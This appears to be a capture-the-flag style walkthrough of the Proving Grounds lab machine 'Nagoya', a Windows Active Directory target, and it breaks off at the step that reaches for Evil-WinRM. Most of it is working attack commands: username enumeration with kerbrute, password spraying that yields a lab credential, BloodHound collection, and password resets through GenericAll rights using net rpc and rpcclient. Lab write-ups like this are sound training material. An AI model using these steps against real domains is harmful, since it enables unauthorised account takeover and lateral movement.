# Info
```bash
Info:
IP: 192.168.237.21
OS:
Domain: nagoya-industries.com
```

# Links:
```bash
https://medium.com/@mu.aktepe18/nagoya-proving-ground-walk-through-afb50d51bb0f

https://aditya-3.gitbook.io/oscp/readme/walkthroughs/pg-practice/nagoya
```
# Standard enum:
```bash
nmap -p- -sCV nagoya.pgp --open
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-12 20:19 EDT
Nmap scan report for nagoya.pgp (192.168.237.21)
Host is up (0.047s latency).
Not shown: 65512 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
80/tcp    open  http              Microsoft IIS httpd 10.0
|_http-title: Nagoya Industries - Nagoya
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-10-13 00:21:45Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
|_ssl-date: 2025-10-13T00:23:20+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=nagoya.nagoya-industries.com
| Not valid before: 2025-10-12T00:18:05
|_Not valid after:  2026-04-13T00:18:05
| rdp-ntlm-info: 
|   Target_Name: NAGOYA-IND
|   NetBIOS_Domain_Name: NAGOYA-IND
|   NetBIOS_Computer_Name: NAGOYA
|   DNS_Domain_Name: nagoya-industries.com
|   DNS_Computer_Name: nagoya.nagoya-industries.com
|   DNS_Tree_Name: nagoya-industries.com
|   Product_Version: 10.0.17763
|_  System_Time: 2025-10-13T00:22:40+00:00
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf            .NET Message Framing
49666/tcp open  msrpc             Microsoft Windows RPC
49668/tcp open  msrpc             Microsoft Windows RPC
49676/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc             Microsoft Windows RPC
49681/tcp open  msrpc             Microsoft Windows RPC
49691/tcp open  msrpc             Microsoft Windows RPC
49698/tcp open  msrpc             Microsoft Windows RPC
49717/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: NAGOYA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-13T00:22:41
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 210.45 seconds
```


# Worth checking:
```bash
80 - http
139, 445 - smb
389, 636, 3268, 3269 - LDAP
3389 - RDP
5985 - WinRM
9389 - ?
```
# 80
in section team, we have nice finding:
![team member first names and surnames](image.png)

We can sue it to create potential usernames
```bash
Matthew Harrison
Emma Miah
Rebecca Bell
Scott Gardner
Terry Edwards
Holly Matthews
Anne Jenkins
Brett Naylor
Melissa Mitchell
Craig Carr
Fiona Clark
Patrick Martin
Kate Watson
Kirsty Norris
Andrea Hayes
Abigail Hughes
Melanie Watson
Frances Ward
Sylvia King
Wayne Hartley
Iain White
Joanna Wood
Bethan Webster
Elaine Brady
Christopher Lewis
Megan Johnson
Damien Chapman
Joanne Lewis
```
Based on this info, we can start preparing list of potential usernames. To do it, download:
```bash
https://github.com/urbanadventurer/username-anarchy
```

and use thos command (for more, please read github page):
```bash
/username-anarchy -i ~/PGP/Nagoya/usernames >> user.names 
```

Our result:

![usernames](image-1.png)

Lets check with kerbrute, which usernames are valid:
```bash
./kerbrute_linux_amd64 userenum --dc nagoya.pgp -d nagoya-industries.com user.names 
```

![Valid usernames](image-2.png)

Now clean this up and we have list:
```bash
matthew.harrison
emma.miah
rebecca.bell
scott.gardner
terry.edwards
holly.matthews
anne.jenkins
brett.naylor
melissa.mitchell
craig.carr
fiona.clark
patrick.martin
kate.watson
kirsty.norris
andrea.hayes
abigail.hughes
melanie.watson
frances.ward
sylvia.king
wayne.hartley
iain.white
joanna.wood
bethan.webster
elaine.brady
christopher.lewis
megan.johnson
damien.chapman
joanne.lewis
```

lets try to find password for them:
```bash
crackmapexec smb nagoya.pgp -u usernames -p /usr/share/seclists/Passwords/corporate_passwords.txt 
```

And we have it!

```bash
fiona.clark:Summer2023
```

Let's check what she can do with bloodhound:
```bash
bloodhound-python -u "fiona.clark" -p 'Summer2023' -d nagoya-industries.com -c all --zip -ns 192.168.237.21
```

![Bloodhound ss](image-3.png)

Fiona is member of employee group with GenericAll entitlments, as per https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html?highlight=GenericAll#genericall-rights-on-user:

"This privilege grants an attacker full control over a target user account. Once GenericAll rights are confirmed using the Get-ObjectAcl command, an attacker can:

Change the Target's Password: Using net user <username> <password> /domain, the attacker can reset the user's password.
From Linux, you can do the same over SAMR with Samba net rpc:
bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>" and some more...
So lets do it!

```bash
 net rpc password joanna.wood 'Password@' -U nagoya-industries.com/fiona.clark%'Summer2023' -S 192.168.237.21

or

rpcclient -U "fiona.clark%Summer2023" nagoya.pgp
rpcclient $> setuserinfo2 joanna.wood 23 Password@
```

Joanna is member of helpdesk, and has Genric all for all employees:

![Bloodhound2 ss](image-4.png)

Last one, Christopher Lewis is member or 5 groups instead of 3 like rest of employees. One of this group is remote managment user which is great for us:

![Bloodhound3 ss](image-5.png)

So now, lest do teh same and change password for chris.
```bash
 net rpc password christopher.lewis 'Password@' -U nagoya-industries.com/joanna.wood%'Password@' -S 192.168.237.21
 ```

 Now evilwinrm